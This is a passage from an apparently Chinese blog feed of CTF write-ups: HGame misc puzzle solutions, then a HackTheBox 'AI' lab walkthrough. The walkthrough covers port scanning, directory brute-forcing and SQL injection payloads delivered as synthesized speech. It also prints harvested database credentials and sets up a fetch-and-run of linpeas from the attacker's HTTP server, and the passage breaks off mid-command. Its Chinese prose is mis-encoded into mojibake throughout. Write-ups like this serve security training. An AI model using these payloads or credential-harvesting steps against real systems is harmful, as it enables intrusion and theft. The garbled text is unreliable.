id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="æ¬¢è¿å‚åŠ HGameï¼"><a href="#æ¬¢è¿å‚åŠ HGameï¼" class="headerlink" title="æ¬¢è¿å‚åŠ HGameï¼"></a>æ¬¢è¿å‚åŠ HGameï¼</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Li0tIC4uLi0tIC4tLi4gLS4tLiAtLS0tLSAtLSAuIC4uLS0uLSAtIC0tLSAuLi0tLi0gLi4tLS0gLS0tLS0gLi4tLS0gLS0tLS0gLi4tLS4tIC4uLi4gLS0uIC4tIC0tIC4uLi0t</span><br></pre></td></tr></table></figure><p>ä¸€å¼€å§‹ä¸å¤ªæ¸…æ¥šè¿™æ˜¯ä»€ä¹ˆç¼–ç ï¼Œåæ¥ç™¾åº¦ä¸€ä¸‹å‘ç°å°±æ˜¯base64ã€‚å›å¤´æƒ³æƒ³ï¼Œå‘ç°æ¯•ç«Ÿæ˜¯æ•°å­—+å­—æ¯çš„ç»„åˆï¼Œå¯ä»¥è€ƒè™‘baseç³»çš„ç¼–ç ã€‚<br>è§£ç åä¸ºmorseç”µç ï¼Œåœ¨çº¿è§£ä¸€ä¸‹å°±å¥½äº†ã€‚</p><h2 id="å£çº¸"><a href="#å£çº¸" class="headerlink" title="å£çº¸"></a>å£çº¸</h2><p>é¢˜ç›®ä¸‹ä¸‹æ¥æ‰“å¼€æ˜¯ä¸ªå›¾ç‰‡ï¼Œæ‰”winhexé‡Œçœ‹å‘ç°æœ«å°¾æç¤ºflag.txtä»¥åŠå¯†ç æ˜¯å›¾ç‰‡idï¼Œå›¾ç‰‡ååˆ™æ ‡æ³¨äº†pixivã€‚ã€‚ã€‚ä¼°è®¡æ˜¯è¦æ”¹æˆå‹ç¼©åŒ…äº†ï¼Œæ‰€ä»¥ä¹Ÿæ²¡å»çœ‹æœ‰æ²¡æœ‰å‹ç¼©åŒ…æ–‡ä»¶ï¼Œå¤´å°±ç›´æ¥æ”¹zipï¼Œæœä¸å…¶ç„¶æ˜¯å‹ç¼©åŒ…ï¼Œå†…å®¹ä¸ºflag.txtï¼Œéœ€è¦å¯†ç ã€‚é‚£å°±ç›´æ¥ä¸Špç«™æ‰¾è¿™ä¸ªç”»å¸ˆå§ï¼ˆæ„Ÿè§‰åƒäº†ä¸€æ³¢å¼ºè¡Œå®‰åˆ©å•Šï¼‰æ‰¾åˆ°å›¾ç‰‡åç”¨å¯†ç çœ‹flag.txtï¼Œæœ€åç»“æœasciiè§£ç ä¸€ä¸‹å°±å¥½ã€‚</p><h2 id="ç­¾åˆ°é¢˜ProPlus"><a href="#ç­¾åˆ°é¢˜ProPlus" class="headerlink" title="ç­¾åˆ°é¢˜ProPlus"></a>ç­¾åˆ°é¢˜ProPlus</h2><p>ä¸€æ—¶å…´èµ·è¿˜æ˜¯çœ‹äº†çœ‹è¿™é“miscã€‚ä¸Šæ¥å…ˆç»™äº†ä¸€ä¸ªå‹ç¼©åŒ…ä¸€ä¸ªæ–‡ä»¶ï¼Œæ–‡ä»¶å†…å®¹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Rdjxfwxjfimknâ€‚z,tsâ€‚wntziâ€‚xtjrwmâ€‚xsfjtâ€‚jmâ€‚ywtâ€‚rtntwhfâ€‚fâ€‚yâ€‚â€‚â€‚hâ€‚jnsxfâ€‚qjFjfâ€‚jnbâ€‚â€‚rgâ€‚fiyykwtbsnkmâ€‚tmâ€‚â€‚xaâ€‚jsdwqjfmkjyâ€‚wlviHtqzqsGsffywjjyynfâ€‚yssmâ€‚xfjypnyihjn.</span><br><span class="line"></span><br><span class="line">JRFVJYFZVRUAGMAI</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">* Three fenses first, Five Caesar next. English sentense first,  zip password next.</span><br></pre></td></tr></table></figure><p>çœ‹åˆ°fencesè·Ÿceaserå°±æƒ³åˆ°äº†æ …æ è·Ÿå‡¯æ’’å¯†ç äº†ã€‚åŠ ä¸Šæç¤ºå…ˆ3æ …æ ï¼Œå†5å‡¯æ’’ï¼Œé‚£ä¹ˆåœ¨çº¿è§£ä¸‹ç ï¼Œå¯¹åº”ç»„æ•°ä¸åç§»æ•°åˆ†åˆ«ä¸º3,5å³å¯ã€‚è§£å‡ºæ¥å‰é¢ä¸€å¥è¯å¦‚ä¸‹ï¼š<br>Manyâ€‚yearsâ€‚laterâ€‚asâ€‚heâ€‚facedâ€‚theâ€‚firingâ€‚squad,â€‚Colonelâ€‚Aurelianoâ€‚Buendiaâ€‚wasâ€‚toâ€‚rememberâ€‚thatâ€‚distantâ€‚afternoonâ€‚whenâ€‚hisâ€‚fatherâ€‚tookâ€‚himâ€‚toâ€‚discoverâ€‚ice.<br>å‡ºè‡ªç™¾å¹´å­¤ç‹¬ï¼Œä¸çŸ¥é“æœ‰ä»€ä¹ˆç”¨ã€‚è§£å‡ºçš„å¯†ç ç”¨æ¥è§£å‹åŠ å¯†çš„å‹ç¼©åŒ…ï¼Œå¾—åˆ°æ–‡æ¡£</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">data:text;ook,</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.............</span><br></pre></td></tr></table></figure><p>æœ‰ç‚¹æ‘¸ä¸ç€å¤´è„‘ï¼Œäºæ˜¯è°·æ­Œä¸€ä¸‹ï¼Œå‘ç°è¿™æ˜¯å±äºbrainfuckç¼–ç ä¸­çš„ä¸€ç§ï¼Œä¸ç¦è®©æˆ‘è”æƒ³åˆ°äº†åŸæ¥ä¼¤çœ¼ç›çš„jsfuckç¼–ç â€¦â€¦é‚£ä¹ˆåœ¨çº¿è§£ç ä¸€ä¸‹ï¼ˆæ‰¾ä¸ªå¥½ç‚¹çš„ç½‘ç«™ï¼Œå¼€å§‹æˆ‘æ‰¾çš„ç½‘ç«™åªè§£äº†ä¸€éƒ¨åˆ†ï¼‰ï¼Œå¾—åˆ°base32ç¼–ç ã€‚å†base32è§£ç ï¼Œå‘ç°å¾—åˆ°çš„ç»“æœå¯ä»¥è¿›è¡Œbase64è§£ç ï¼Œä¸”ç»“æœå¼€å¤´æœ‰å›¾ç‰‡çš„æ–‡ä»¶å¤´ã€‚é‚£ä¹ˆå¯ä»¥ç¡®è®¤æ˜¯å›¾ç‰‡æ–‡ä»¶å†…å®¹è¿›è¡Œäº†base64ç¼–ç ã€‚é‚£ç›´æ¥è§£å‡ºæ–‡ä»¶å°±å¥½äº†ï¼ˆå¯ä»¥ç”¨pythonï¼Œä¹Ÿå¯ä»¥åœ¨çº¿ï¼‰ã€‚å¾—åˆ°äºŒç»´ç ï¼Œç›´æ¥æ‰«ç å¾—flagã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hackthebox-AIâ€”â€”æœ‰è¶£çš„sql+JDWPgetshell</title>
      <link href="2020/01/29/hackthebox-AI%E2%80%94%E2%80%94%E6%9C%89%E8%B6%A3%E7%9A%84sql-JDWPgetshell/"/>
      <url>2020/01/29/hackthebox-AI%E2%80%94%E2%80%94%E6%9C%89%E8%B6%A3%E7%9A%84sql-JDWPgetshell/</url>
      
        <content type="html"><![CDATA[<p>ç»ˆäºåˆç­‰åˆ°hacktheboxæ›´æ–°é€€å½¹é¶æœºäº†ï¼Œè¿™æ¬¡çš„é¶æœºæ˜¯AIã€‚å› ä¸ºæ¯”è¾ƒæœ‰æ„æ€æ‰€ä»¥æ¥è®°å½•ä¸‹ã€‚ä¸è¿‡è¿‡ç¨‹å¹¶éä¸€å¸†é£é¡ºã€‚å…¶ä¸­è¿˜é‡åˆ°é¶æœºç£ç›˜å†™æ»¡å¯¼è‡´æ— æ³•å†™å…¥æ–‡ä»¶çš„äº‹ã€‚åˆ äº†åŠå¤©æ‰æƒ³èµ·æ¥è¦é‡è®¾é¶æœºâ€¦â€¦</p><p>è·Ÿä¸Šæ¬¡ä¸€æ ·å‚è€ƒäº†ä¸‹å¤§ç¥çš„è§†é¢‘<a href="https://www.youtube.com/watch?v=7n7YRntu3bc&t=1391s" target="_blank" rel="noopener">https://www.youtube.com/watch?v=7n7YRntu3bc&amp;t=1391s</a>è§†é¢‘çœŸçš„éå¸¸è‰¯å¿ƒã€‚</p><a id="more"></a><p>(è¿™æ¬¡åšä¹‹å‰æ›´æ–°kaliè™šæ‹Ÿæœº,åˆæŠŠè‡ªå·±çš„è™šæ‹Ÿæœºå¼„æ­»æœºäº†â€¦â€¦å¥½åœ¨ç°åœ¨ä¸é‚£ä¹ˆå®¹æ˜“æ•´ä½“ç‚¸æ‰ï¼Œå€’æ˜¯kaliçš„ç•Œé¢è¶Šæ›´æ–°è¶Šèˆ’é€‚ï¼ŒæŒºä¸é”™çš„)<br><img src="/2020/01/29/hackthebox-AI%E2%80%94%E2%80%94%E6%9C%89%E8%B6%A3%E7%9A%84sql-JDWPgetshell/a12.PNG" class="lazyload" data-srcset="a12.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="AI"></p><p><strong>æœ¬æœºip:10.10.15.60</strong></p><p><strong>é¶æœºip:10.10.10.163</strong></p><p>é¦–å…ˆç¬¬ä¸€æ­¥å½“ç„¶æ˜¯æ¢æµ‹ç«¯å£äº†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">namp -sC -sV -oA ai 10.10.10.163</span><br></pre></td></tr></table></figure><p><img src="/2020/01/29/hackthebox-AI%E2%80%94%E2%80%94%E6%9C%89%E8%B6%A3%E7%9A%84sql-JDWPgetshell/a1.PNG" class="lazyload" data-srcset="a1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="nmap"></p><p>å‘ç°æœ‰22ä¸80ç«¯å£å¼€æ”¾ã€‚æ—¢ç„¶æœ‰httpæœåŠ¡ï¼Œé‚£å°±å°è¯•ç›´æ¥è®¿é—®å§ã€‚<br>æœ‰ä¸€ä¸ªä¸»é¡µé¢ã€‚åŒæ—¶ä¹Ÿå‘ç°äº†å…¶ä»–phpæ–‡ä»¶ï¼Œå”¯ä¸€æ¯”è¾ƒæœ‰æ„æ€çš„å°±æ˜¯ä¸‹é¢è¿™ä¸ª<code>ai.php</code>é¡µé¢ï¼Œæœ‰ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ ç‚¹ã€‚<br><img src="/2020/01/29/hackthebox-AI%E2%80%94%E2%80%94%E6%9C%89%E8%B6%A3%E7%9A%84sql-JDWPgetshell/a2.PNG" class="lazyload" data-srcset="a2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="ai"></p><p>ä½†æ˜¯å¾ˆå¥‡æ€ªã€‚å±…ç„¶æ˜¯<code>.wav</code>fileã€‚é€šå¸¸æˆ‘æ‰€çŸ¥é“çš„æ–‡ä»¶ä¸Šä¼ ç‚¹ä¹Ÿå°±å›¾ç‰‡é©¬æˆ–è€…pharååºåˆ—åŒ–æˆ–è€…å…¶ä»–ç±»å‹çš„getshellã€‚è€Œå®ƒæç¤ºçš„drop your query using wav file.ä¼¼ä¹æ˜¯åœ¨è¯´æ˜æˆ‘ä»¬å¯ä»¥è¿›è¡ŒæŸ¥è¯¢æ“ä½œã€‚</p><p>é‚£ä¹ˆé¦–å…ˆéšä¾¿ä¼ ä¸€ä¸ªtest.phpä¸Šå»ã€‚å†…å®¹éšæ„ã€‚å‘ç°æ²¡æœ‰å›æ˜¾ã€‚<br><img src="/2020/01/29/hackthebox-AI%E2%80%94%E2%80%94%E6%9C%89%E8%B6%A3%E7%9A%84sql-JDWPgetshell/a3.PNG" class="lazyload" data-srcset="a3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="test"></p><p>çœ‹æ¥æ˜¯è¦<code>wav</code>çš„éŸ³é¢‘æ–‡ä»¶äº†ã€‚ä½¿ç”¨éŸ³é¢‘æ–‡ä»¶æ‰§è¡ŒæŸ¥è¯¢ï¼Œè¿™ç‚¹çœŸçš„éš¾ä»¥å¼„æ‡‚ã€‚é‚£ä¹ˆåœ¨å°è¯•å¼„æ¸…æ¼æ´ç±»å‹ä¹‹å‰å…ˆæ¥ç›®å½•çˆ†ç ´ä¸€ä¸‹ï¼Œçœ‹æœ‰æ²¡æœ‰ä»€ä¹ˆåˆ«çš„ä¿¡æ¯ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http:&#x2F;&#x2F;10.10.10.163 -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt -x php</span><br></pre></td></tr></table></figure><p>åŸºäºè¿™é‡Œéƒ½æ˜¯phpï¼Œæˆ‘ä»¬åœ¨gobusteråç€é‡åŠ ä¸Š<code>-x php</code>è¿›è¡Œç­›é€‰ã€‚<br>è§£æœå¤§è‡´å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;index.php (Status: 200)</span><br><span class="line">&#x2F;contact.php (Status: 200)</span><br><span class="line">&#x2F;about.php (Status: 200)</span><br><span class="line">&#x2F;images (Status: 301)</span><br><span class="line">&#x2F;uploads (Status: 301)</span><br><span class="line">&#x2F;db.php (Status:301)</span><br><span class="line">&#x2F;intelligence.php(Status: 200)</span><br><span class="line">&#x2F;ai.php(Status: 200)</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ai.phpç­‰ç­‰éƒ½æ˜¯ä¸»é¡µé¢å°±æä¾›äº†çš„ã€‚æ–°å‘ç°çš„é¡µé¢åŒ…æ‹¬<code>intelligence.php</code>è·Ÿ<code>db.php</code>ã€‚ä¸Šä¼ è·Ÿå›¾ç‰‡ç•Œé¢æˆ‘ä»¬éƒ½æ²¡æœ‰æƒé™è¿›å»ã€‚é‚£ä¹ˆè®¿é—®ä¸‹å”¯ä¸€å¯ä»¥è®¿é—®çš„<code>intelligence.php</code><br><img src="/2020/01/29/hackthebox-AI%E2%80%94%E2%80%94%E6%9C%89%E8%B6%A3%E7%9A%84sql-JDWPgetshell/a4.PNG" class="lazyload" data-srcset="a4.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="intelligence.php"></p><p>å‘ç°äº†è¿™ä¸ªé¡µé¢ã€‚ä¼¼ä¹å­˜åœ¨ç€è¯è¯­çš„æ›¿æ¢å…³ç³»ã€‚ä»è¡¨çš„å³åˆ—ä¸­æˆ‘ä»¬ä¸éš¾æ‰¾åˆ°ä¸€äº›ç†Ÿæ‚‰çš„ç¬¦å·â€“<code>union</code>,<code>#</code>,<code>---</code>,<code>Schema</code>ç­‰ç­‰ã€‚è¿™äº›éƒ½æ˜¯å¸¸å¸¸å‡ºç°åœ¨<strong>sqlæ³¨å…¥</strong>ä¸­çš„ç¬¦å·ã€‚ç»“åˆæˆ‘ä»¬è¿˜çˆ†ç ´å‡ºäº†db.phpï¼Œå¯ä»¥çŒœæƒ³æ˜¯å¦æœ‰sqlæ³¨å…¥çš„æ¼æ´å‘¢ï¼Ÿ</p><p>ç­”æ¡ˆæ˜¯æ­£ç¡®çš„ã€‚è€Œä¸”è„‘æ´å¤§å¼€çš„æ˜¯ï¼šæˆ‘ä»¬è¦ç”¨è¯­è¨€è½¬æˆéŸ³é¢‘æ–‡ä»¶ä¸Šä¼ æ¥è¿›è¡Œæ³¨å…¥ã€‚è¿™ä¹Ÿè®¸å°±æ˜¯è¿™ä¸ªAIé¶æœºçš„åå­—æ‰€åœ¨å§ã€‚</p><p>é¦–å…ˆgoogle linux say commandï¼Œ å‘ç°æœ‰è¿™æ ·çš„ä¸€ä¸ªè½¯ä»¶ã€‚å«åšfestivalã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install festival</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨å®ƒå…¶ä¸­ä¸€ä¸ªå«text2waveçš„å°±èƒ½å°†è¯­å¥è½¬æˆè¯­éŸ³æ–‡ä»¶ã€‚æ¯”å¦‚ç”¨ä¸‹ç®¡é“ç¬¦ï¼Œç”Ÿæˆä¸€ä¸ªtest.wavï¼Œå†…å®¹ä¸ºhelloã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;Hello&quot;| text2wave -o test.wav</span><br></pre></td></tr></table></figure><p><img src="/2020/01/29/hackthebox-AI%E2%80%94%E2%80%94%E6%9C%89%E8%B6%A3%E7%9A%84sql-JDWPgetshell/a5.PNG" class="lazyload" data-srcset="a5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="test"></p><p>å°è¯•å¬ä¸‹è¿™ä¸ªéŸ³é¢‘ï¼Œå‘ç°æ˜¯ä¸ªç”·ä½éŸ³ï¼ˆä¹Ÿè®¸æ˜¯æœºå™¨åˆæˆéŸ³?ï¼‰ç„¶åå†æ¬¡å°è¯•ä¸Šä¼ <br><img src="/2020/01/29/hackthebox-AI%E2%80%94%E2%80%94%E6%9C%89%E8%B6%A3%E7%9A%84sql-JDWPgetshell/a6.PNG" class="lazyload" data-srcset="a6.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="hello"><br>å‘ç°inputæœ‰ç»“æœï¼Œé‚£ä¹ˆå°±å°è¯•ä¸‹ç¿»è¯‘æˆè‹±æ–‡æ¥sqlæ³¨å…¥å§ã€‚<br>(è¿™ç‚¹å¯¹éè‹±è¯­æ¯è¯­çš„å›½å®¶çš„äººåº”è¯¥éå¸¸ä¸å‹å¥½â€¦â€¦æ¯•ç«Ÿæœ‰äº›åé—¨çš„æ‹¬å·ä¹‹ç±»çš„è‹±æ–‡æˆ‘ä¹Ÿä¸å¤ªç†Ÿï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">( openparenthesis å·¦æ‹¬å·</span><br><span class="line">) closeparenthesis å³æ‹¬å·</span><br><span class="line">- hyphen   è¿å­—ç¬¦</span><br></pre></td></tr></table></figure><p>åŸºäºä¸€å¼€å§‹è¿˜æ¢æµ‹åˆ°çš„<code>intelligence.php</code>ä¸­æœ‰äº›å­—ç¬¦å¯¹åº”å…³ç³»ï¼Œä¸éš¾æƒ³åˆ°æˆ‘ä»¬éœ€è¦ä½¿ç”¨é‚£å¼ è¡¨æ¥ç»•è¿‡æ³¨å…¥<br>æ¯”å¦‚æˆ‘çš„å°è¯•payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; union select database()---</span><br></pre></td></tr></table></figure><p>éœ€è¦æ¢ä½œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open single quote, join select , database open parenthesis close parenthesis comment database</span><br></pre></td></tr></table></figure><p>å†é‡å¤ä¸Šé¢ç”Ÿæˆtest.wavçš„æ“ä½œï¼Œå°±å¯ä»¥ä¸Šä¼ æ³¨å…¥ã€‚<br><img src="/2020/01/29/hackthebox-AI%E2%80%94%E2%80%94%E6%9C%89%E8%B6%A3%E7%9A%84sql-JDWPgetshell/a7.PNG" class="lazyload" data-srcset="a7.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="database"></p><p>åŸºäºhacktheboxæ˜“å¾—userçš„å°¿æ€§ï¼Œå¯ä»¥çŒœå‡ºä¸€å¼ usersè¡¨ç„¶åçˆ†å‡ºusernameè·Ÿpassword</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#39;union select username from user---</span><br><span class="line">open single quote, join , select , username from users comment database</span><br><span class="line">open single quote, join , select , password from users comment database</span><br></pre></td></tr></table></figure><p><img src="/2020/01/29/hackthebox-AI%E2%80%94%E2%80%94%E6%9C%89%E8%B6%A3%E7%9A%84sql-JDWPgetshell/a8.PNG" class="lazyload" data-srcset="a8.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="username"><br><img src="/2020/01/29/hackthebox-AI%E2%80%94%E2%80%94%E6%9C%89%E8%B6%A3%E7%9A%84sql-JDWPgetshell/a9.PNG" class="lazyload" data-srcset="a9.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="password"></p><p>æ˜¾ç„¶ï¼Œæˆ‘ä»¬çš„httpé¡µé¢å¹¶æ²¡æœ‰ä»€ä¹ˆè®©æˆ‘ä»¬ç™»å½•è¿›å»çš„æ–¹æ³•æˆ–é¡µé¢ã€‚åŸºäºä¹‹å‰çš„ç«¯å£æ¢æµ‹å‘ç°æœ‰sshå¼€æ”¾ï¼Œä¸å¦¨å°è¯•sshç™»å½•<br><img src="/2020/01/29/hackthebox-AI%E2%80%94%E2%80%94%E6%9C%89%E8%B6%A3%E7%9A%84sql-JDWPgetshell/a10.PNG" class="lazyload" data-srcset="a10.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="ssh login"><br>æˆåŠŸç™»é™†ã€‚å¹¶ä¸”user.txtå°±åœ¨å½“å‰ç›®å½•ä¸‹ã€‚</p><p>ä¹‹åå°±æ˜¯å¸¸è§„ææƒçš„è¿‡ç¨‹äº†ã€‚</p><p>è¿™é‡Œå¼€å§‹å¯èƒ½ä¼šæƒ³åˆ°ä¹‹å‰æ²¡æˆåŠŸè®¿é—®çš„db.phpï¼Œåœ¨<code>/var/www/html</code>ä¸­çˆ†å‡ºå†…å®¹<br><img src="/2020/01/29/hackthebox-AI%E2%80%94%E2%80%94%E6%9C%89%E8%B6%A3%E7%9A%84sql-JDWPgetshell/a11.PNG" class="lazyload" data-srcset="a11.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="mysql"><br>å¯çŸ¥usernameä¸º<code>dbuser</code>,passwordä¸º<code>toor</code><br>è¿›å…¥mysqlå¯ç”¨çš„å°±å¤šäº†ã€‚ï¼ˆç„¶è€Œæˆ‘è¿›å»çš„æ—¶å€™åº“è¢«åˆ«äººåˆ äº†â€¦â€¦ï¼‰å®é™…ä¸Šå¯ä»¥çˆ†å‡ºä¹‹å‰alexaæ‰€åœ¨userè¡¨çš„å†…å®¹ä¸­</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username:root</span><br><span class="line">password:H,Sq9t6&#125;a&lt;)?q931</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯sshç™»å½•å¹¶ä¸æˆåŠŸã€‚mysqlè¿™æ¡è·¯èµ°ä¸é€šã€‚</p><p>ä¼—æ‰€å‘¨çŸ¥ï¼Œå‘ç°ææƒçš„æ¼æ´ç‚¹å¹¶ä¸æ˜¯ä¸€ä»¶å®¹æ˜“çš„äº‹ï¼Œå°¤å…¶æ˜¯å¯¹æˆ‘è¿™æ ·çš„å°ç™½è€Œè¨€ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»dalaoè§†é¢‘é‚£å‘ç°äº†ä¸€ä¸ªå¾ˆå‰å®³çš„è„šæœ¬å¯ä»¥è§£å†³æˆ‘è‡ªå·±çš„æ¼æ´è®¤çŸ¥é—®é¢˜ã€‚<br><a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite" target="_blank" rel="noopener">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite</a><br>åœ¨é¶æœºä¸Šä½¿ç”¨å…¶ä¸­çš„<code>linpeas.sh</code>ï¼Œè„šæœ¬å°±ä¼šè‡ªåŠ¨åˆ†æå¯èƒ½ææƒçš„æ¼æ´ç‚¹ã€‚ç€å®è§£å†³ä¸å°‘é—®é¢˜ã€‚ä¸è¿‡é€šå¸¸ç»“æœåˆè‡­åˆé•¿ï¼Œå¯èƒ½éœ€è¦è€å¿ƒæ‰¾ä¸€æ‰¾ã€‚<br>å…·ä½“æ–¹æ³•ä¹Ÿå¾ˆç®€å•ï¼Œæœ¬æœºgit cloneå¥½åï¼Œèµ·ä¸€ä¸ªpythonç›‘å¬ï¼ˆé»˜è®¤8000ç«¯å£ï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer</span><br></pre></td></tr></table></figure><p>åœ¨é¶æœºä¸Šç›´æ¥curlåæ‰§è¡Œå°±å¥½äº†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl 